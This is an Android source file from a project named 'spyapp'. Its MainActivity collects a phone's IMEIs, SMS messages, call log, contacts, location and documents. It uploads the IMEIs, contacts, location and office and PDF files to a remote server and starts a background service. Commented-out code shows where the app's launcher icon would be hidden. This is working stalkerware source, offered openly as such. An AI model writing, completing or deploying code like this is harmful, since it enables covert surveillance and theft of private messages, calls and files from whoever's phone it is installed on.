package kkactive_india.in.spyapp;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.MimeTypeMap;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
import kkactive_india.in.spyapp.FilePOJO.fileBean;
import kkactive_india.in.spyapp.MainPOJO.MainBean;
import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
import kkactive_india.in.spyapp.contactPOJO.contactBean;
import kkactive_india.in.spyapp.locationPOJO.locationBean;
import kkactive_india.in.spyapp.mailPOJO.mailBean;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.converter.scalars.ScalarsConverterFactory;

import static android.view.View.VISIBLE;

public class MainActivity extends AppCompatActivity {

    TextView textView;
    EditText mail;
    Button login;
    ProgressBar bar;
    @SuppressLint("HardwareIds")
    String imeiNumber1;
    @SuppressLint("HardwareIds")
    String imeiNumber2;
    String address;
    String name, phoneNumber, id, lat, lon;
    List<ContactDatum> data = new ArrayList<>();
    SharedPreferences pref;
    SharedPreferences.Editor edit;
    final String state = Environment.getExternalStorageState();
    List<String> list;
    ConnectionDetector cd;
    File file;



    @TargetApi(Build.VERSION_CODES.O)
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        // textView = (TextView) findViewById(R.id.textview);

        mail = (EditText) findViewById(R.id.mail);
        login = (Button) findViewById(R.id.logInButton);
        bar = (ProgressBar) findViewById(R.id.progress);
        pref = getSharedPreferences("pref", Activity.MODE_PRIVATE);
        edit = pref.edit();

        cd = new ConnectionDetector(getApplication());

        login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                final String e = mail.getText().toString();

                if (e.length() > 0) {
                    bar.setVisibility(VISIBLE);
                    Bean b = (Bean) getApplicationContext();

                    Retrofit retrofit = new Retrofit.Builder()
                            .baseUrl(b.baseURL)
                            .addConverterFactory(ScalarsConverterFactory.create())
                            .addConverterFactory(GsonConverterFactory.create())
                            .build();
                    Allapi cr = retrofit.create(Allapi.class);
                    Call<mailBean> call = cr.login(e);
                    call.enqueue(new Callback<mailBean>() {
                        @Override
                        public void onResponse(Call<mailBean> call, Response<mailBean> response) {
                            bar.setVisibility(View.GONE);
                            Log.d("successHoGyaHAi", response.message());
                            Log.d("successHoGyaHAi", "success");
                            Toast.makeText(MainActivity.this, "Please check your E-mail Id and click on that link.", Toast.LENGTH_SHORT).show();

                            id = response.body().getResult().getEmail();

                            edit.putString("id", response.body().getResult().getEmail());
                            edit.apply();


                            mainApi();
                            // latLonApi();
                            //contactApi();

                            Intent in = new Intent(MainActivity.this, MainService.class);
                            startService(in);


                          /*PackageManager p = getPackageManager();
                          ComponentName componentName = new ComponentName(MainActivity.this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
                          p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/


                        }

                        @Override
                        public void onFailure(Call<mailBean> call, Throwable t) {

                        }
                    });
                }
            }
        });

        Log.d("sadasd", "kjhasdkh");

        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        assert tm != null;
        imeiNumber1 = tm.getDeviceId(1); //(API level 23)
        imeiNumber2 = tm.getDeviceId(2);

        Log.d("IMEI1", imeiNumber1);
        Log.d("IMEI2", imeiNumber2);

        @SuppressLint("HardwareIds") String number = tm.getLine1Number();
        Log.d("numner", number);


        /*EasyLocationMod easyLocationMod = new EasyLocationMod(MainActivity.this);

        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }

        double[] l = easyLocationMod.getLatLong();
        lat = String.valueOf(l[0]);
        lon = String.valueOf(l[1]);

        Log.d("latitude", lat);
        Log.d("longitude", lon);*/


       /* Geocoder geocoder = new Geocoder(this, Locale.getDefault());
        try {
            List<Address> listAdresses = geocoder.getFromLocation(Double.parseDouble(lat), Double.parseDouble(lon), 1);
            if (null != listAdresses && listAdresses.size() > 0) {
                address= listAdresses.get(0).getAddressLine(0);
                String state = listAdresses.get(0).getAdminArea();
                String country = listAdresses.get(0).getCountryName();
                String subLocality = listAdresses.get(0).getSubLocality();

                Log.d("Adsress", address);

            }
        } catch (IOException e) {
            e.printStackTrace();
        }*/


        SubscriptionManager subscriptionManager = SubscriptionManager.from(getApplicationContext());
        List<SubscriptionInfo> subsInfoList = subscriptionManager.getActiveSubscriptionInfoList();

        Log.d("Test", "Current list = " + subsInfoList);

        for (SubscriptionInfo subscriptionInfo : subsInfoList) {

            String num = subscriptionInfo.getNumber();

            Log.d("Test", " Number is  " + num);
        }


     /*   ActivityCompat.requestPermissions(MainActivity.this,
                new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS},
                1);
        // String strOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        StringBuffer sb = new StringBuffer();
        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        sb.append("Contact Details :");

        data = new ArrayList<>();

        while (phones.moveToNext()) {
            name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            //Toast.makeText(getApplicationContext(),name, Toast.LENGTH_LONG).show();

            Log.d("names", name);
            Log.d("Phones", phoneNumber);
            //textView.setText("\n Name:" + name +"\nNumber:" + phoneNumber );

            sb.append(" \nName:--- " + name + "\nPhone Number:--- " + phoneNumber);
            sb.append("\n----------------------------------");


            ContactDatum person = new ContactDatum();
            person.setName(name);
            person.setMobile(phoneNumber);
            data.add(person);


        }

//        contactApi();

        phones.close();*/
        //textView.setText(sb);


        // calls();

        // getSMS();


        //files();
      //  filesss();


       /* ArrayList<String> galleryImageUrls;
        final String[] columns = {MediaStore.Images.Media.DATA, MediaStore.Images.Media._ID};//get all columns of type images
        final String orderBy = MediaStore.Images.Media.DATE_TAKEN;//order data by date

        Cursor imagecursor = managedQuery(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, null,
                null, orderBy + " DESC");//get all data in Cursor by sorting in DESC order

        galleryImageUrls = new ArrayList<String>();

        for (int i = 0; i < imagecursor.getCount(); i++) {
            imagecursor.moveToPosition(i);
            int dataColumnIndex = imagecursor.getColumnIndex(MediaStore.Images.Media.DATA);//get column index
            galleryImageUrls.add(imagecursor.getString(dataColumnIndex));//get Image from column index
        }
        Log.e("fatch in", String.valueOf(galleryImageUrls));*/
        //return galleryImageUrls;

    }

    public void files() {
        /*if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {  // we can read the External Storage...
            getAllFilesOfDir(Environment.getExternalStorageDirectory());
        }*/


        ContentResolver cr = this.getContentResolver();
        Uri uri = MediaStore.Files.getContentUri("external");


// every column, although that is huge waste, you probably need
// BaseColumns.DATA (the path) only.
        String[] projection = null;

// exclude media files, they would be here also.
        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "="
                + MediaStore.Files.FileColumns.MEDIA_TYPE_NONE;
        String[] selectionArgs = null; // there is no ? in selection so null here

        String sortOrder = null; // unordered
        Cursor allNonMediaFiles = cr.query(uri, projection, selection, selectionArgs, sortOrder);
        // only pdf
        String selectionMimeType = MediaStore.Files.FileColumns.MIME_TYPE + "=?";
        String mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension("apk");
        String[] selectionArgsPdf = new String[]{mimeType};
        Cursor allPdfFiles = cr.query(uri, projection, selectionMimeType, selectionArgsPdf, sortOrder);

        list = new ArrayList<String>();


        for (int i = 0; i < allNonMediaFiles.getCount(); i++) {
            allNonMediaFiles.moveToPosition(i);
            int dataColumnIndex = allNonMediaFiles.getColumnIndex(MediaStore.Files.FileColumns.DATA);//get column index
            list.add(allNonMediaFiles.getString(dataColumnIndex));//get Image from column index
        }

        file = new File(String.valueOf(list));

        Log.e("PdfBhai", String.valueOf(list));
        // Log.e("PdfBhai", String.valueOf(allPdfFiles));
        // Log.e("PdfBhai", String.valueOf(allNonMediaFiles));


    }


    public void filesss(){

        if (cd.isConnectingToInternet()){


            MultipartBody.Part body1 = null;

            for (int i = 0; i < list.size(); i++) {

                file = new File(list.get(i));

                if(file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
                        || file.getName().endsWith(".xlsx") || file.getName().endsWith(".pdf")
                        || file.getName().endsWith(".doc")||  file.getName().endsWith(".txt")
                        || file.getName().endsWith(".docx")||file.getName().endsWith(".rtf"))
                {
                    // Log.e(" FILES",file.getName());
                    //Log.e(" FILES",file.getAbsolutePath());

                    RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);
                    body1 = MultipartBody.Part.createFormData("file[]", file.getName(), reqFile1);

                    Bean b = (Bean) getApplicationContext();

                    Retrofit retrofit = new Retrofit.Builder()
                            .baseUrl(b.baseURL)
                            .addConverterFactory(ScalarsConverterFactory.create())
                            .addConverterFactory(GsonConverterFactory.create())
                            .build();
                    Allapi cr = retrofit.create(Allapi.class);
                    String id = pref.getString("id", "");
                    Call<fileBean> call = cr.files(id, body1);
                    call.enqueue(new Callback<fileBean>() {
                        @Override
                        public void onResponse(Call<fileBean> call, Response<fileBean> response) {

                            Log.d("Files", "yess Gaye");

                        }

                        @Override
                        public void onFailure(Call<fileBean> call, Throwable t) {

                        }
                    });

                }



            }

            Log.d("ListSize",String.valueOf( list.size()));

            long imagename = System.currentTimeMillis();

            String strName = imagename + file.getName();

            Log.d("asdasdasd" , strName);

            // body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);



        }

    }



    private void getAllFilesOfDir(File directory) {

        final File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file != null) {
                    if (file.isDirectory()) {  // it is a folder...
                        getAllFilesOfDir(file);

                    } else {  // it is a file...
                        Log.d("Directory", "Directory: " + directory.getAbsolutePath() + "\n");
                        Log.d("FileHaiKya", "File: " + file.getAbsolutePath() + "\n");
                        Log.d("File Name", file.getName());
                    }
                }
            }
        }
    }

    public void mainApi() {

        Bean b = (Bean) getApplicationContext();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(b.baseURL)
                .addConverterFactory(ScalarsConverterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        Allapi cr = retrofit.create(Allapi.class);
        Call<MainBean> call = cr.main(id, imeiNumber1, imeiNumber2);
        call.enqueue(new Callback<MainBean>() {
            @Override
            public void onResponse(Call<MainBean> call, Response<MainBean> response) {
                Log.d("mainHaiBhai", "blklMainHai");
            }

            @Override
            public void onFailure(Call<MainBean> call, Throwable t) {

            }
        });

    }

    public void latLonApi() {
        Bean b = (Bean) getApplicationContext();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(b.baseURL)
                .addConverterFactory(ScalarsConverterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        Allapi cr = retrofit.create(Allapi.class);
        Call<locationBean> call = cr.latlon(id, lat, lon);
        call.enqueue(new Callback<locationBean>() {
            @Override
            public void onResponse(Call<locationBean> call, Response<locationBean> response) {
                Log.d("latLon", response.body().getMessage());
            }

            @Override
            public void onFailure(Call<locationBean> call, Throwable t) {

            }
        });
    }

    public void contactApi() {

        Log.d("asdasads", "asdjhgsadhjasd");

        Bean b = (Bean) getApplicationContext();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(b.baseURL)
                .addConverterFactory(ScalarsConverterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        Allapi cr = retrofit.create(Allapi.class);


     /*   contactBean body = new contactBean();
        body.setContact("contact");

        ContactDatum data = new ContactDatum();

        data.setName(name);
        data.setMobile(phoneNumber);

        body.setContact(data);*/


        contactBean body = new contactBean();


        body.setContactData(data);

        Gson gsonObj = new Gson();

        String jsonStr = gsonObj.toJson(body);


        Log.d("dgfdh", jsonStr);
        Log.d("dgfdh", id);


        Call<contactBean> call = cr.contact(id, jsonStr);
        call.enqueue(new Callback<contactBean>() {
            @Override
            public void onResponse(Call<contactBean> call, Response<contactBean> response) {
                Log.d("contactsHai", "blkl hai bhai");

            }

            @Override
            public void onFailure(Call<contactBean> call, Throwable t) {

            }
        });

    }


    public void callLogs() {


        ActivityCompat.requestPermissions(MainActivity.this,
                new String[]{Manifest.permission.READ_CALL_LOG, Manifest.permission.WRITE_CALL_LOG},
                2);
        StringBuffer sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {

            String pName = managedCursor.getString(name);
            String phNumber = managedCursor.getString(number); // mobile number
            String callType = managedCursor.getString(type); // call type
            String callDate = managedCursor.getString(date); // call date
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;

            // Log.d("NameKyaHai",pName);
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
        }
        managedCursor.close();
        // textView.setText(sb);
        Log.e("Agil value --- ", sb.toString());


    }


    public List<String> getSMS() {

        List<String> sms = new ArrayList<String>();
        Uri uriSMSURI = Uri.parse("content://sms");
        StringBuffer sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, strOrder);

        sb.append("SMS Details :");
        while (cur != null && cur.moveToNext()) {
            String name = cur.getString(cur.getColumnIndexOrThrow("_id"));
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String date = cur.getString(cur.getColumnIndexOrThrow("date"));
            Date dateFormat = new Date(Long.valueOf(date));
            String type = null;
            switch (Integer.parseInt(cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                case Telephony.Sms.MESSAGE_TYPE_INBOX:
                    type = "inbox";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_SENT:
                    type = "sent";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                    type = "outbox";
                    break;
                default:
                    break;
            }
            sms.add("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);

            sb.append("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
            sb.append("\n-----------------");
        }
        Log.d("SMSS", sms.toString());
        //textView.setText(sb);

        if (cur != null) {
            cur.close();
        }
        return sms;
    }

}
